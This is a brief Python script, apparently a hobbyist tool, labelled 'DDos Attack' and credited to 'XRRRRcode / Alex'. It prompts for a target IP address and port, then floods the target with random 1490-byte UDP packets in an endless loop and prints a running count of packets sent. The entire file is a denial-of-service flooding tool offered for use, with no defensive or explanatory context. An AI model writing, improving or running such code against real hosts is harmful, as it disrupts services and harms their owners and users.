import sys
import os
import time
import socket
import random
from datetime import datetime
now=datetime.now()
hour=now.hour
minute=now.minute
day=now.day
month=now.month
year=now.year
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes=random._urandom(1490)
os.system("clear")
os.system("figlet DDos Attack")
print("Author  :XRRRRcode / Alex")
ip=input("IP Target : ")
port=input("Port      : ")
os.system("clear")
sent=0
while True:
  sock.sendto(bytes,(ip,port))
  sent=sent+1
  print("Sent %s packet to %s"%(sent,ip))

